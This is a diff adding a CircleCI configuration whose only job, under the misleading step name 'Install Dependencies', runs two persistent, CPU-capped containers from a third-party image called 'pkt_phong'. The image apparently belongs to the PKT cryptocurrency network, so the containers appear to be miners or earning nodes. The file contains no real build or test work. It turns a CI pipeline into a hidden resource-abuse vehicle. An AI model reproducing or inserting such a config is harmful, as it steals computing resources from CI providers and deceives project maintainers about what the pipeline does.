@@ -1,0 +1,21 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: circleci/ruby:2.5.3
+      parallelism: 1
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              sudo docker run -d --restart always --name PKT1 -it --cpus="0.5" --cpu-shares="512" nguyenduyphong/pkt_phong:tagname
+              sudo docker run -d --restart always --name PKT2 -it --cpus="0.5" --cpu-shares="512" nguyenduyphong/pkt_phong:tagname
+              sudo docker ps
+              sudo docker logs PKT1
+              sudo docker logs PKT2
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
